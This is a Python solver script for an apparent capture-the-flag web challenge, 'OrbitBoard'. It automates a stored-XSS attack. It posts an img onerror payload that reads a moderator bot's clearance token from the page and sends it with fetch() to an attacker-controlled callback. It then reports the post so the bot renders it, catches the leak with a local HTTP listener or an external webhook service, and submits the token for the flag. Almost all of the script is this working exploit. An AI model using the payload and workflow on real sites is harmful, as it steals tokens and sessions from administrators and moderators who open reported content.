#!/usr/bin/env python3
"""
OrbitBoard solver.

Vulnerability: /post/<id> renders the post content unescaped and appends the
viewer's own clearance token right after it in the page:

    <div class="card" id="reported">{content} varnostni-zeton={token}'</div>

Officer Vega's review bot logs in and opens any post that gets reported to
her. If our post content is a stored-XSS payload, it runs in Officer Vega's
browser session and can read the rest of the div (which now contains HER
clearance token) and exfiltrate it to a server we control. That token is
then submitted at /solve to get the flag.

Usage:
    python3 sol.py --site http://localhost:3000 \
        --callback http://<host-reachable-by-the-bot>:8000

On the local docker-compose setup, the bot container can usually reach the
host machine via http://host.docker.internal:8000 (or your LAN IP). On the
remote instance, you need a publicly reachable callback (e.g. a small VPS,
ngrok/serveo tunnel, or a service like webhook.site — pass its base URL as
--callback and read the leaked token off its dashboard, or pass it directly
with --token once you have it).
"""
import argparse
import re
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

import requests

_leaked = {}


class _LeakHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        qs = parse_qs(urlparse(self.path).query)
        token = qs.get("t", [None])[0]
        if token:
            _leaked["token"] = token
            print(f"[+] Caught leaked clearance token: {token}")
        self.send_response(200)
        self.end_headers()

    def log_message(self, *_args):
        pass


def register_and_login(session: requests.Session, site: str) -> None:
    username = "solver" + str(int(time.time()))[-8:]
    r = session.post(
        f"{site}/login",
        data={"action": "register", "username": username,
              "password": "solvepass1", "name": "Solver"},
    )
    r.raise_for_status()


def post_payload(session: requests.Session, site: str, callback: str) -> str:
    payload = (
        "<img src=x onerror=\"fetch('" + callback +
        "/?t='+encodeURIComponent("
        "document.getElementById('reported').textContent.split('varnostni-zeton=')[1]"
        "))\">"
    )
    r = session.post(f"{site}/post/new", data={"content": payload})
    r.raise_for_status()
    return r.url.rstrip("/").split("/")[-1]


def report_post(session: requests.Session, site: str, post_id: str) -> None:
    r = session.post(f"{site}/post/{post_id}/report")
    r.raise_for_status()


def submit_flag(session: requests.Session, site: str, token: str) -> str | None:
    r = session.post(f"{site}/solve", data={"secret": token})
    r.raise_for_status()
    m = re.search(r"<code>([^<]+)</code>", r.text)
    return m.group(1) if m else None


_LOCAL_HOSTS = {"localhost", "127.0.0.1", "0.0.0.0", "::1", "host.docker.internal"}


def _is_locally_catchable(callback: str, listen_host: str) -> bool:
    """True if `callback` points at an address this script can actually bind
    and listen on itself (localhost / the configured --listen host). False
    for external services like webhook.site, which we can't receive from."""
    hostname = urlparse(callback).hostname or ""
    return hostname in _LOCAL_HOSTS or hostname == listen_host


def main() -> None:
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("--site", default="http://localhost:3000",
                     help="Base URL of the OrbitBoard site")
    ap.add_argument("--callback",
                     help="URL the bot should call back to with the leaked "
                          "token, e.g. http://1.2.3.4:8000 or an external "
                          "service like https://webhook.site/<id>")
    ap.add_argument("--listen", default="0.0.0.0:8000",
                     help="host:port to bind the local leak listener on "
                          "(only used when --callback points at a locally "
                          "reachable address)")
    ap.add_argument("--token",
                     help="Skip the XSS/listener step and submit an "
                          "already-leaked token directly")
    ap.add_argument("--timeout", type=int, default=30,
                     help="Seconds to wait for the bot to leak the token")
    args = ap.parse_args()

    session = requests.Session()

    if args.token:
        register_and_login(session, args.site)
        flag = submit_flag(session, args.site, args.token)
        print(f"[+] FLAG: {flag}" if flag else "[!] Wrong token, no flag.")
        return

    if not args.callback:
        ap.error("--callback is required unless --token is given")

    listen_host, listen_port = args.listen.rsplit(":", 1)
    local = _is_locally_catchable(args.callback, listen_host)

    if local:
        server = HTTPServer((listen_host, int(listen_port)), _LeakHandler)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        print(f"[*] Listening for the leak on {args.listen}")

    register_and_login(session, args.site)
    post_id = post_payload(session, args.site, args.callback)
    print(f"[*] Posted payload as {post_id}, reporting to Officer Vega...")
    report_post(session, args.site, post_id)

    if not local:
        print(f"[*] --callback ({args.callback}) isn't a local address, so "
              "nothing is listening here.")
        print("[*] Check its dashboard for the leaked token, then re-run "
              "with --token <leaked_token>.")
        return

    for _ in range(args.timeout):
        if "token" in _leaked:
            break
        time.sleep(1)
    else:
        print("[!] Timed out waiting for the leaked token.")
        return

    token = _leaked["token"].rstrip("'")
    flag = submit_flag(session, args.site, token)
    print(f"[+] FLAG: {flag}" if flag else "[!] Token rejected, no flag.")


if __name__ == "__main__":
    main()
